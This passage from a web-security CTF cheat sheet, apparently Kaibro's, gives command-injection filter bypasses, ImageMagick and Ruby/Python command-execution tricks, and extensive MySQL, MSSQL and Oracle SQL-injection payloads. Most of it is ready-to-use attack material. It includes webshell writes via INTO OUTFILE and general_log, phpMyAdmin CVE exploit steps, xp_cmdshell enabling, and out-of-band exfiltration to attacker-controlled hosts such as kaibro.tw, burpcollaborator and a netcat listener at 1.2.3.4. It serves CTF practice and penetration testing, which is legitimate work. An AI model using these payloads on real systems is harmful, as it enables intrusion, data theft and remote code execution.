    # < php 8.1: Fatal error
    ```
    - [ref](https://karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce)


# Command Injection

```
| cat flag
&& cat flag
; cat flag
%0a cat flag
"; cat flag
`cat flag`
cat $(ls)
"; cat $(ls)
`cat flag | nc kaibro.tw 5278`

. flag
PS1=$(cat flag)

`echo${IFS}${PATH}|cut${IFS}-c1-1`
=> /
```

## ? and *
- `?` match one character
    - `cat fl?g`
    - `/???/??t /???/p??s??`
- `*` match 多個
    - `cat f*`
    - `cat f?a*`

## 空白繞過

- `${IFS}`
    - `cat${IFS}flag`
    - `ls$IFS-alh`
    - `cat$IFS$2flag`
- `cat</etc/passwd`
- `{cat,/etc/passwd}`
- `X=$'cat\x20/etc/passwd'&&$X`
- ``` IFS=,;`cat<<<uname,-a` ```
    - bash only


## Keyword繞過

- String Concat
    - `A=fl;B=ag;cat $A$B`
- Empty Variable
    - `cat fl${x}ag`
    - `cat tes$(z)t/flag`
    
- Environment Variable
    - `$PATH => "/usr/local/….blablabla”`
        - `${PATH:0:1}   => '/'`
        - `${PATH:1:1}   => 'u'`
        - `${PATH:0:4}   => '/usr'`
    - `${PS2}` 
        - `>`
    - `${PS4}`
        - `+`
- Empty String
    - `cat fl""ag`
    - `cat fl''ag`
        - `cat "fl""ag"`

- 反斜線
    - `c\at fl\ag`

## ImageMagick

- CVE-2016-3714 (ImageTragick)
    - `mvg` 格式包含 https 處理(使用 curl 下載)，可以閉合雙引號
    - payload:
    ```mvg
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://kaibro.tw";ls "-la)'
    pop graphic-context
    ```
- Example
    - [Google CTF 2019 - GPhotos](https://blog.bushwhackers.ru/googlectf-2019-gphotos-writeup/)
        - `Some Debians appear to have insecure ImageMagick configuration by default`
        - read file:
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <svg width="120px" height="120px">
          <image width="120" height="120" href="text:/etc/passwd" />
        </svg>
        ```
        - copy file (MSL):
        ```xml
        <image>    <!-- ImageMagick's legend is "image processing" so the tag is named "image". -->
          <read filename="image.png" />    <!-- To make the legend more compelling "image.png" is checked to be a valid image file. -->
          <write filename="/var/www/html/shell.php" />    <!-- This line gives access to a hacker accomplishing the mission of the MSL format and ImageMagick in general -->
        </image>
        ```
    - [TokyoWesterns CTF 2018 - Slack emoji converter](https://ctftime.org/writeup/10912)
        - ghostscript RCE
    - [TokyoWesterns CTF 2019 - Slack emoji converter Kai](https://balsn.tw/ctf_writeup/20190831-tokyowesternsctf/#slack-emoji-converter-kai-(unsolved))
        - ghostscript RCE


## Ruby Command Executing

- `open("| ls")`
- `IO.popen("ls").read`
- `Kernel.exec("ls")`
- `Kernel.method("open").call("|ls").read()`
- ``` `ls` ```
- `system("ls")`
- `eval("ruby code")`
    - Non-Alphanumeric example: [HITCON CTF 2015 - Hard to say](https://github.com/w181496/CTF/tree/master/hitcon2015/hard-to-say)
        - `$$/$$` => 1
        - `'' << 97 << 98 << 99` => "abc"
        - `$:`即`$LOAD_PATH`
- `exec("ls")`
- `%x{ls}` / `%x'ls'` / `%x[ls]` / `%x(ls)` / `%x;ls;`
- `"Process".constantize.spawn("id")`
- `Process.spawn("id")`
- `PTY.spawn("id")`
- Net::FTP
    - CVE-2017-17405
    - use `Kernel#open`

## Python Command Executing
- `os.system("ls")`
- `os.popen("ls").read()`
- `os.execl("/bin/ls","")`
- `os.execlp("ls","")`
- `os.execv("/bin/ls",[''])`
- `os.execvp("/bin/ls",[""])`
- `subprocess.call("ls")`
    - `subprocess.call("ls|cat",shell=False)` => Fail
    - `subprocess.call("ls|cat",shell=True)` => Correct
- `eval("__import__('os').system('ls')")`
- `exec("__import__('os').system('ls')")`
- `commands.getoutput('ls')`

## Read File

- diff /etc/passwd /flag
- paste /flag
- bzmore /flag
- bzless /flag
- static-sh /flag
- ...

# SQL Injection


## MySQL

- 子字串：
    - `substr("abc",1,1) => 'a'`
    - `mid("abc", 1, 1)  => 'a'`
- Ascii function
    - `ascii('A') => 65 `
- Char function
    - `char(65) => 'a'`
- Concatenation
    - `CONCAT('a', 'b') => 'ab'`
        - 如果任何一欄為 NULL，則返回 NULL
    - `CONCAT_WS(分隔符, 字串1, 字串2...)`
        - `CONCAT_WS('@', 'gg', 'inin')` => `gg@inin`
- Cast function
    - `CAST('125e342.83' AS signed) => 125`
    - `CONVERT('23',SIGNED) => 23`
- Delay function
    - `sleep(5)`
    - `BENCHMARK(count, expr)`
- 空白字元
    - `09 0A 0B 0C 0D A0 20`
- File-read function
    - `LOAD_FILE('/etc/passwd')`
    - `LOAD DATA INFILE`
        - Client 讀 Server 文件
        - 一樣受 `secure_file_priv`, `FILE` privilege 限制 (ref: [link](https://dev.mysql.com/doc/refman/8.0/en/load-data.html))
    - `LOAD DATA LOCAL INFILE`
        - Server 讀 Client 文件
        - `LOAD DATA LOCAL INFILE '/etc/hosts' INTO TABLE test FIELDS TERMINATED BY "\n";`
        - 不需要 `FILE` privilege，且任意目錄檔案皆可讀 (只要 Client 有權限即可)
        - support UNC Path
            - `LOAD DATA LOCAL INFILE '\\\\172.16.136.153\\test' into table mysql.test FIELDS TERMINATED BY "\n";`
                - stealing net-NTLM hash
        - Trigger phar deserialization
            - `LOAD DATA LOCAL INFILE 'phar://test.phar/test' INTO TABLE a LINES TERMINATED BY '\n'`
            - 非 default 設置
              ```
              [mysqld]
              local-infile=1
              secure_file_priv=""
              ```

        - Tool
            - [Rogue-MySQL-Server](https://github.com/allyshka/Rogue-MySql-Server)
            - [MysqlClientAttack](https://github.com/lcark/MysqlClientAttack)
        - Example
            - [N1CTF 2019 - sql_manage](https://xz.aliyun.com/t/6300)
            - [HITCON 2019 - GoGoPowerSQL](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/README.md#gogo-powersql)
            - [0CTF 2018 Final - h4x0rs.club](https://l4wio.github.io/CTF-challenges-by-me/0ctf_final-2018/0ctf_tctf_2018_slides.pdf)
            - [VolgaCTF 2018 - Corp Monitoring](https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html)
    - load_file with WebDAV
        - `load_file('//kaibro.tw@9478/meow.php')` / `load_file('\\\\kaibro.tw@9478/meow.php')`
            - Windows 環境有開 WebClient Service 時，可以透過 MySQL load_file + UNC Path 發送 HTTP Reuqest 到指定 URL (透過 `@` 指定 Port)
            - 實戰中，站庫分離環境，若後端 MySQL 主機有開 Web 環境，則可透過該方法先寫 webshell 再送 http request 觸發執行
        - Example
            - [Balsn CTF 2023 - ginowa](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2023#ginowa)
- File-write
    - `INTO DUMPFILE`
        - 適用 binary (寫入同一行)
    - `INTO OUTFILE`
        - 適用一般文本 (有換行)
    - 寫webshell
        - 需知道可寫路徑
        - `UNION SELECT "<? system($_GET[1]);?>",2,3 INTO OUTFILE "/var/www/html/temp/shell.php"`
    - 權限
        - `SELECT file_priv FROM mysql.user`
    - secure-file-priv
        - 限制 MySQL 導入導出
            - load_file, into outfile, load data 等
        - 運行時無法更改
        - MySQL 5.5.53 前，該變數預設為空(可以導入導出)
        - e.g. `secure_file_priv=E:\`
            - 限制導入導出只能在 E:\ 下
        - e.g. `secure_file_priv=null`
            - 限制不允許導入導出    
        - secure-file-priv 限制下用 general_log 拿 shell
        ```
        SET global general_log='on';

        SET global general_log_file='C:/phpStudy/WWW/cmd.php';

        SELECT '<?php assert($_POST["cmd"]);?>';
        ```
- IF語句
    - IF(condition,true-part,false-part)
    - `SELECT IF (1=1,'true','false')`
- Hex
    - `SELECT X'5061756c';  =>  paul`
    - `SELECT 0x5061756c; => paul`
    - `SELECT 0x5061756c+0 => 1348564332`
    - `SELECT load_file(0x2F6574632F706173737764);`
        - /etc/passwd
    - 可繞過一些 WAF
        - e.g. 用在不能使用單引號時(`'` => `\'`)
         - CHAR() 也可以達到類似效果
             - `'admin'` => `CHAR(97, 100, 109, 105, 110)`
- 註解：
    - `#`
    - `--`
    - `/**/`
        - 一個 `*/` 可以閉合前面多個 `/*`
    - `/*! 50001 select * from test */`
        - 可探測版本
        - e.g. `SELECT /*!32302 1/0, */ 1 FROM tablename`
    - `
        - MySQL <= 5.5
    - `;`
        - PDO 支援多語句
- information_schema
    - mysql >= 5.0
- Stacking Query
    - 預設 PHP+MySQL 不支援 Stacking Query
    - 但 PDO 可以 Stacking Query
- 其它：
    - @@version
        - 同 version()
    - user()
        - current_user
        - current_user()
        - SESSION_USER()
        - SYSTEM_USER()
        - current user 
    - system_user()
        - database system user
    - database()
        - schema()
        - current database
    - @@basedir
        - MySQL 安裝路徑
    - @@datadir
        - Location of db file
    - @@plugin_dir
    - @@hostname
    - @@version_compile_os
        - Operating System
    - @@version_compile_machine
    - @@innodb_version
    - @@global.secure_file_priv
    - MD5()
    - SHA1()
    - COMPRESS() / UNCOMPRESS()
    - group_concat()
        - 合併多條結果
            - e.g. `select group_concat(username) from users;` 一次返回所有使用者名
        - group_concat_max_len = 1024 (default)
    - json_arrayagg()
        - MySQL >= 5.7.22
        - 概念同上
            - e.g. `SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES`
    - greatest()
        - `greatest(a, b)`返回 a, b 中最大的
        - `greatest(1, 2)=2`
            - 1
        - `greatest(1, 2)=1`
            - 0
    - between a and b
        - 介於 a 到 b 之間
        - `greatest(1, 2) between 1 and 3`
            - 1
    - regexp
        - `SELECT 'abc' regexp '.*'`
            - 1
    - Collation
        - `*_ci` case insensitive collation 不區分大小寫
        - `*_cs` case sensitive collation 區分大小寫
        - `*_bin` binary case sensitive collation 區分大小寫

- Union Based
    - 判斷 column 數
        - `union select 1,2,3...N`
        - `order by N` 找最後一個成功的 N
    - `AND 1=2 UNION SELECT 1, 2, password FROM admin--+`
    - `LIMIT N, M` 跳過前 N 筆，抓 M 筆
    - 爆資料庫名
        - `union select 1,2,schema_name from information_schema.schemata limit 1,1`
    - 爆表名
        - `union select 1,2,table_name from information_schema.tables where table_schema='mydb' limit 0,1`
        - `union select 1,2,table_name from information_schema.columns where table_schema='mydb' limit 0,1`
    - 爆Column名
        - `union select 1,2,column_name from information_schema.columns where table_schema='mydb' limit 0,1`
    - MySQL User
        - `SELECT CONCAT(user, ":" ,password) FROM mysql.user;`
- Error Based
    - 長度限制
        - 錯誤訊息有長度限制
        - `#define ERRMSGSIZE (512)`
    - Overflow
        - MySQL > 5.5.5 overflow 才會有錯誤訊息
        - `SELECT ~0` => `18446744073709551615`
        - `SELECT ~0 + 1` => ERROR
        - `SELECT exp(709)` => `8.218407461554972e307`
        - `SELECT exp(710)` => ERROR
        - 若查詢成功，會返回0
            - `SELECT exp(~(SELECT * FROM (SELECT user())x));`
            - `ERROR 1690(22003):DOUBLE value is out of range in 'exp(~((SELECT 'root@localhost' FROM dual)))'`
        - `select (select(!x-~0)from(select(select user())x)a);`
            - `ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'`
            - MySQL > 5.5.53 不會顯示查詢結果
    - xpath
        - extractvalue (有長度限制，32位)
            - `select extractvalue(1,concat(0x7e,(select @@version),0x7e));`
            - `ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'`
        - updatexml (有長度限制，32位)
            - `select updatexml(1,concat(0x7e,(select @@version),0x7e),1);`
            - `ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'`
    - 主鍵重複
        - `select count(*) from test group by concat(version(),floor(rand(0)*2));`
            - `ERROR 1062 (23000): Duplicate entry '5.7.171' for key '<group_key>'`
    - 其它函數 (5.7)
        - `select ST_LatFromGeoHash(version());`
        - `select ST_LongFromGeoHash(version());`
        - `select GTID_SUBSET(version(),1);`
        - `select GTID_SUBTRACT(version(),1);`
        - `select ST_PointFromGeoHash(version(),1);`
    - 爆庫名、表名、字段名
        - 當過濾 `information_schema` 等關鍵字時，可以用下面方法爆庫名
            - `select 1,2,3 from users where 1=abc();`
                - `ERROR 1305 (42000): FUNCTION fl4g.abc does not exist`
        - 爆表名
            - `select 1,2,3 from users where Polygon(id);`
            - ``select 1,2,3 from users where linestring(id);``
                - ```ERROR 1367 (22007): Illegal non geometric '`fl4g`.`users`.`id`' value found during parsing```
        - 爆Column
            - `select 1,2,3 from users where (select * from  (select * from users as a join users as b)as c);`
                - `ERROR 1060 (42S21): Duplicate column name 'id'`
            - `select 1,2,3 from users where (select * from  (select * from users as a join users as b using(id))as c);`
                - `ERROR 1060 (42S21): Duplicate column name 'username'`
- Blind Based (Time/Boolean)
    - Boolean
        - 「有」跟「沒有」
        - `id=87 and length(user())>0`
        - `id=87 and length(user())>100`
        - `id=87 and ascii(mid(user(),1,1))>100`
        - `id=87 or ((select user()) regexp binary '^[a-z]')`
    - Time
        - 用在啥結果都看不到時
        - `id=87 and if(length(user())>0, sleep(10), 1)=1`
        - `id=87 and if(length(user())>100, sleep(10), 1)=1`
        - `id=87 and if(ascii(mid(user(),1,1))>100, sleep(10), 1)=1`

- Out of Bnad
    - Windows only
    - `select load_file(concat("\\\\",schema_name,".dns.kaibro.tw/a")) from information_schema.schemata`

- 繞過空白檢查
    - `id=-1/**/UNION/**/SELECT/**/1,2,3`
    - `id=-1%09UNION%0DSELECT%0A1,2,3`
    - `id=(-1)UNION(SELECT(1),2,3)`

- 寬字節注入
    - `addslashes()` 會讓 `'` 變 `\'`
    - 在 `GBK` 編碼中，中文字用兩個 Bytes 表示
        - 其他多字節編碼也可
        - 但要低位範圍有包含 `0x5c`(`\`)
    - 第一個 Byte 要 >128 才是中文
    - `%df'` => `%df\'` => `運'` (成功逃逸)

- Order by注入
    - 可以透過 `asc`、`desc` 簡單判斷
        - `?sort=1 asc`
        - `?sort=1 desc`
    - 後面不能接 UNION
    - 已知字段名 (可以盲注)
        - `?order=IF(1=1, username, password)`
    - 利用報錯
        - `?order=IF(1=1,1,(select 1 union select 2))` 正確
        - `?order=IF(1=2,1,(select 1 union select 2))` 錯誤
        - `?order=IF(1=1,1,(select 1 from information_schema.tables))` 正常
        - `?order=IF(1=2,1,(select 1 from information_schema.tables))` 錯誤
    - Time Based
        - `?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))` 正常
        - `?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))` sleep 2秒

- group by with rollup
    - `' or 1=1 group by pwd with rollup limit 1 offset 2#`

- 將字串轉成純數字
    - 字串 -> 16進位 -> 10進位
    - `conv(hex(YOUR_DATA), 16, 10)`
    - 還原：`unhex(conv(DEC_DATA,10,16))`
    - 需注意不要 Overflow

- 不使用逗號
    - `LIMIT N, M` => `LIMIT M OFFSET N`
    - `mid(user(), 1, 1)` => `mid(user() from 1 for 1)`
    - `UNION SELECT 1,2,3` => `UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)`

- 快速查找帶關鍵字的表
    - `select table_schema,table_name,column_name from information_schema.columns where table_schema !=0x696E666F726D6174696F6E5F736368656D61 and table_schema !=0x6D7973716C and table_schema !=0x706572666F726D616E63655F736368656D61 and (column_name like '%pass%' or column_name like '%pwd%');
    `

- 不知列名、不能訪問 information_schema 爆數據
    - 須知道表名
    - 例如: artice、admin
    - `select title from article where id = 4 and 0 union SELECT group_concat(a, 0x3a, b) FROM (SELECT 1 a,2 b,3 c UNION SELECT * FROM admin)x`
    - 列名不夠，繼續加 4,5,6,7,... 一直到猜對列名個數

- innodb
    - 表引擎為 innodb
    - MySQL > 5.5
    - innodb_table_stats、innodb_table_index存放所有庫名表名
    - `select table_name from mysql.innodb_table_stats where database_name=資料庫名;`
    - Example: [Codegate2018 prequal - simpleCMS](https://github.com/w181496/CTF/tree/master/codegate2018-prequal/simpleCMS)

- sys
    - `sys.statements_with_full_table_scans`
    - 可以撈表名
    - 詳見 [PPP simpleCMS writeup](https://github.com/pwning/public-writeup/tree/master/codegate2018/Simple%20CMS)
    - `select query from sys.statements_with_full_table_scans`
    - MySQL 5.7

- Bypass WAF

    - `select password` => `SelEcT password` (大小寫)
    - `select password` => `select/**/password` (繞空白)
    - `select password` => `s%65lect%20password` (URLencode)
    - `select password` => `select(password)` (繞空白)
    - `select password` => `select%0apassword` (繞空白)
        - %09, %0a, %0b, %0c, %0d, %a0
    - `select password from admin` => `select password /*!from*/ admin` (MySQL註解)
    - `information_schema.schemata` => ``` `information_schema`.schemata ``` (繞關鍵字/空白)
        - ``` select xxx from`information_schema`.schemata``` 
    - `select pass from user where id='admin'` => `select pass from user where id=0x61646d696e` (繞引號)
        - `id=concat(char(0x61),char(0x64),char(0x6d),char(0x69),char(0x6e))`
    - `?id=0e2union select 1,2,3` (科學記號)
        - `?id=1union select 1,2,3`會爛
        - `?id=0e1union(select~1,2,3)` (~)
        - `?id=.1union select 1,2,3` (點)
    - `WHERE` => `HAVING` (繞關鍵字)
    - `AND` => `&&` (繞關鍵字)
        - `OR` => `||`
        - `=` => `LIKE`
        - `a = 'b'` => `not a > 'b' and not a < 'b'`
        - `> 10` => `not between 0 and 10`
    - `LIMIT 0,1` => `LIMIT 1 OFFSET 0` (繞逗號)
        - `substr('kaibro',1,1)` => `substr('kaibro' from 1 for 1)`
    - Multipart/form-data繞過
        - http://xdxd.love/2015/12/18/%E9%80%9A%E8%BF%87multipart-form-data%E7%BB%95%E8%BF%87waf/
        - Example: [Real World CTF 4th - Hack into Skynet](https://github.com/w181496/CTF/tree/master/RealWorldCTF2022/Hack_into_Skynet)
    - 偽造 User-Agent
        - e.g. 有些 WAF 不封 google bot

- phpMyAdmin
    - 寫文件 getshell
        - 條件
            - root 權限
            - 已知 web 路徑
            - 有寫檔權限
        - `select "<?php phpinfo();?>" INTO OUTFILE  "c:\\phpstudy\\www\\shell.php"`
    - general_log getshell
        - 條件
            - 讀寫權限
            - 已知 web 路徑
        - step1. 開啟日誌: `set global general_log = "ON";`
        - step2. 指定日誌文件: `set global general_log_file = "/var/www/html/shell.php";`
        - step3. 寫入php: `select "<?php phpinfo();?>";`
    - slow_query getshell
        - step1. 設置日誌路徑: `set GLOBAL slow_query_log_file='/var/www/html/shell.php';`
        - step2. 開啟 slow_query_log: `set GLOBAL slow_query_log=on;`
        - step3. 寫入 php: `select '<?php phpinfo();?>' from mysql.db where sleep(10);`
    - CVE-2018-19968
        - phpMyAdmin versions: 4.8.0 ~ 4.8.3
        - LFI to RCE
        - 條件
            - 能登入後台
        - step1. `CREATE DATABASE foo;CREATE TABLE foo.bar (baz VARCHAR(100) PRIMARY KEY );INSERT INTO foo.bar SELECT '<?php phpinfo(); ?>';`
        - step2. `/chk_rel.php?fixall_pmadb=1&db=foo`
        - step3. ```INSERT INTO` pma__column_infoSELECT '1', 'foo', 'bar', 'baz', 'plop','plop', ' plop', 'plop','../../../../../../../../tmp/sess_{SESSIONID}','plop';```
        - step4. `/tbl_replace.php?db=foo&table=bar&where_clause=1=1&fields_name[multi_edit][][]=baz&clause_is_unique=1`
    - CVE-2018-12613
        - phpMyAdmin versions: 4.8.x
        - LFI to RCE
        - 條件
            - 能登入後台
        - Payload
            - `index.php?target=db_sql.php%253f/../../../../../../windows/system.ini`
            - `index.php?target=sql.php%253f/../../../tmp/tmp/sess_16rme70p2qqnqjnhdiq3i6unu`
                - 在控制台執行的 sql 語句會被寫入 session
                - Session id 可以從 cookie `phpMyAdmin` 得到
    - CVE-2016-5734
        - phpmyadmin versions:
            - 4.0.10.16 之前的4.0.x版本
            - 4.4.15.7 之前的 4.4.x版本
            - 4.6.3之前的 4.6.x版本
        - php version:
            - 4.3.0 ~ 5.4.6
        - `preg_replace` RCE
        - 條件
            - 能登入後台
    - CVE-2014-8959
        - phpMyAdmin version:
            - 4.0.1 ~ 4.2.12
        - php version:
            - < 5.3.4
        - 條件
            - 能登入後台
            - 能截斷
        - Payload: `gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&gis_data[gis_type]=/../../../../phpinfo.txt%00` (需修改token)
    - CVE-2013-3238
        - versions: 3.5.x < 3.5.8.1 and 4.0.0 < 4.0.0-rc3 ANYUN.ORG
        - https://www.exploit-db.com/exploits/25136
    - CVE-2012-5159
        - versions: v3.5.2.2
        - server_sync.php Backdoor
        - https://www.exploit-db.com/exploits/21834
    - CVE-2009-1151
        - versions: 2.11.x < 2.11.9.5 and 3.x < 3.1.3.1
        - config/config.inc.php 命令執行
        - https://www.exploit-db.com/exploits/8921
    - 弱密碼 / 萬用密碼
        - phpmyadmin 2.11.9.2: root/空密碼
        - phpmyadmin 2.11.3 / 2.11.4: 用戶名: `'localhost'@'@"`

## MSSQL

- 子字串：
    - `SUBSTRING("abc", 1, 1) => 'a'`
- Ascii function
    - `ascii('A') => 65 `
- Char function
    - `char(65) => 'a'`
- Concatenation
    - `+`
    - `'a'+'b' => 'ab'`
- Delay function
    - `WAITFOR DELAY '0:0:10'`
- 空白字元
    - `01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20`
- IF 語句
    - IF condition true-part ELSE false-part
    - `IF (1=1) SELECT 'true' ELSE SELECT 'false'`
- 註解：
    - `--`
    - `/**/`
- TOP
    - MSSQL 沒有 `LIMIT N, M` 的用法
    - `SELECT TOP 87 * FROM xxx` 取最前面 87 筆
    - 取第 78~87 筆
        - `SELECT pass FROM (SELECT pass, ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS LIMIT FROM mydb.dbo.mytable)x WHERE LIMIT between 78 and 87`
- 其它：
    - user
    - db_name()
    - user_name()
    - @@version
    - @@language
    - @@servername
    - host_name()
    - has_dbaccess('master')
- 查詢用戶 
    - `select name, loginame from master..syslogins, master..sysprocesses`
- 查用戶密碼 
    - `select user,password from master.dbo.syslogins`
- 當前角色是否為資料庫管理員
    - `SELECT is_srvrolemember('sysadmin')`
- 當前角色是否為db_owner
    - `SELECT IS_MEMBER('db_owner')`
- 爆DB name
    - ```DB_NAME(N)```
    - ```UNION SELECT NULL,DB_NAME(N),NULL--```
    - ```UNION SELECT NULL,name,NULL FROM master ..sysdatabases--```
    - `SELECT catalog_name FROM information_schema.schemata`
    - ```1=(select name from master.dbo.sysdatabases where dbid=5)```
- 爆表名
    - `SELECT table_catalog, table_name FROM information_schema.tables`
    - `SELECT name FROM sysobjects WHERE xtype='U'`
    - `ID=02';if (select top 1 name from DBname..sysobjects where xtype='U' and name not in ('table1', 'table2'))>0 select 1--`

- 爆column
    - `SELECT table_catalog, table_name, column_name FROM information_schema.columns`
    - `SELECT name FROM syscolumns WHERE id=object_id('news')`
    - `ID=1337';if (select top 1 col_name(object_id('table_name'), i) from sysobjects)>0 select 1--`
    - `SELECT name FROM DBNAME..syscolumns WHERE id=(SELECT id FROM DBNAME..sysobjects WHERE name='TABLENAME')`

- 一次性獲取全部資料
    - `select quotename(name) from master..sysdatabases FOR XML PATH('')`
    - `select concat_ws(0x3a,table_schema,table_name,column_name) from information_schema.columns for json auto`
- Union Based
    - Column 型態必須相同
    - 可用`NULL`來避免
- Error Based
    - 利用型別轉換錯誤
    - `id=1 and user=0`
- Out of Band
    - `declare @p varchar(1024);set @p=(SELECT xxxx);exec('master..xp_dirtree "//'+@p+'.oob.kaibro.tw/a"')`
    - `fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null)`
        - Requires VIEW SERVER STATE permission on the server
    - `fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)`
        - Requires the CONTROL SERVER permission.
    - `fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.oob.kaibro.tw',default)`
        - Requires the CONTROL SERVER permission.
- 判斷是否站庫分離
    - 客戶端主機名: `select host_name();`
    - 服務端主機名: `select @@servername;`
    - 兩者不同即站庫分離

- 讀檔
    - `select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)`

- xp_cmdshell
    - 在 MSSQL 2000 默認開啟
    - MSSQL 2005 之後默認關閉
    - 有 sa 權限，可透過 sp_configure 重啟它
    
    ```
    EXEC sp_configure 'show advanced options',1
    RECONFIGURE 
    EXEC sp_configure 'xp_cmdshell',1
    RECONFIGURE
    ```

    - 執行 command
        - `exec xp_cmdshell 'whoami'`

    - 關閉xp_cmdshell
    
    ```
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure'xp_cmdshell', 0;
    RECONFIGURE;
    ```

- 快速查找帶關鍵字的表
    - `SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' AND (syscolumns.name LIKE '%pass%' or syscolumns.name LIKE '%pwd%' or syscolumns.name LIKE '%first%');`


- 繞 WAF
    - Non-standard whitespace character:
        - `1%C2%85union%C2%85select%C2%A0null,@@version,null--`
    - 混淆 UNION
        - `0eunion+select+null,@@version,null--`
    - Unicode 繞過
        - IIS 對 Unicode 編碼是可以解析的，即 `s%u0065lect` 會被解析為 select

## Oracle

- `SELECT` 語句必須包含 `FROM`
    - 未指定來源，可以用 `dual` 表
- 子字串：
    - `SUBSTR('abc', 1, 1) => 'a'`
- 空白字元
    - `00 0A 0D 0C 09 20`
- IF語句
    - `IF condition THEN true-part [ELSE false-part] END IF`
- 註解：
    - `--`
    - `/**/`
- 不支援 limit
    - 改用 rownum
    - `select table_name from (select rownum no, table_name from all_tables) where no=1`
- 單雙引號
    - 單引號: string, date
    - 雙引號: identifier (table name, column name, ...)
- 其它
    - `SYS.DATABASE_NAME`
        - current database
    - `USER`
        - current user
        - or `sys.login_user`
    - `SELECT role FROM session_roles`
        - current role
    - `SELECT privilege FROM user_sys_privs`
        - system privileges granted to the current user
    - `SELECT privilege FROM role_sys_privs`
        - privs the current role has
    - `SELECT privilege FROM session_privs`
        - the all privs that current user has = user_sys_privs + role_sys_privs
    - `SELECT banner FROM v$version where rownum=1`
        - database version
    - `SELECT host_name FROM v$instance;`
        - Name of the host machine
    - `SELECT banner FROM v$version WHERE banner LIKE 'TNS%'`
        - 作業系統版本
    - `utl_inaddr.get_host_address`
        - 本機IP
    - `select utl_inaddr.get_host_name('87.87.87.87') from dual`
        - IP反解
    - `dba_tables`
        - 系統所有表資訊，需要 dba 權限
    - `user_tables`
        - 當前使用者名下表的資訊
- 庫名(schema)
    - `SELECT DISTINCT OWNER FROM ALL_TABLES`
- 表名
    - `SELECT OWNER, TABLE_NAME FROM ALL_TABLES`
- Column
    - `SELECT OWNER, TABLE_NAME, COLUMN_NAME FROM ALL_TAB_COLUMNS`
- Union Based
    - Column 型態必須相同
    - 可用 `NULL` 來避免錯誤
    - `UNION SELECT 1, 'aa', null FROM dual`
- Time Based
    - `dbms_pipe.receive_message(('a'),10)`
        - `SELECT CASE WHEN (CONDITION_HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
- Error Based
    - `CTXSYS.DRITHSX.SN`
        - `SELECT * FROM news WHERE id=1 and CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE rownum=1))=1`
    - `utl_inaddr.get_host_name`
        - `and 1=utl_inaddr.get_host_name((SQL in HERE))`
        - 版本 >=11g，需要超級用戶或授予網路權限的用戶才能用
    - `dbms_xdb_version.checkin`
        - `and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null`
    - `dbms_xdb_version.makeversioned`
        - `and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null`
    - `dbms_xdb_version.uncheckout`
        - `and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null`
    - `dbms_utility.sqlid_to_sqlhash`
        - `and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null`
- Out of band
    - `UTL_HTTP.request('http://kaibro.tw/'||(select user from dual))=1`
    - `SYS.DBMS_LDAP.INIT()`
    - `utl_inaddr.get_host_address()`
    - `HTTPURITYPE`
        - `SELECT HTTPURITYPE('http://30cm.club/index.php').GETCLOB() FROM DUAL;`
    - `extractvalue()` XXE
        - `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT xxxx)||'.oob.kaibro.tw/"> %remote;]>'),'/l') FROM dual`
        - 新版已 patch
- users
    - `select username from all_users`
        - lists all users of the database
    - `select name, password from sys.user$`
    - `select username,password,account_status from dba_users`
- Java source
    - 可以創建 Java 源碼並存成 Oracle 物件
    - `CREATE JAVA SOURCE NAMED "xxxx" AS <Java Code>`
- Code execution
    - load lib
        - `create or replace library lib_evil as '/home/oracle/evil.so';`
        - `create or replace function cmd(str varchar2) return varchar2 as language c library lib_evil name "cmd";`
        - `select cmd('whoami') from dual;`
    - `dbms_java.runjava`
        - `dbms_java.runjava('com/sun/tools/script/shell/Main -e "var p = java.lang.Runtime.getRuntime().exec(''$cmd'');"')`
    - `DBMS_JAVA_TEST.FUNCALL`
        - `SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/usr/bin/bash','-c','/bin/ls|/usr/bin/nc 1.2.3.4 1234') FROM DUAL;`
    - `DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES`
        - 利用 PL/SQL Injection 提權
        - 影響版本: Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2
        ```sql
        -- 提權
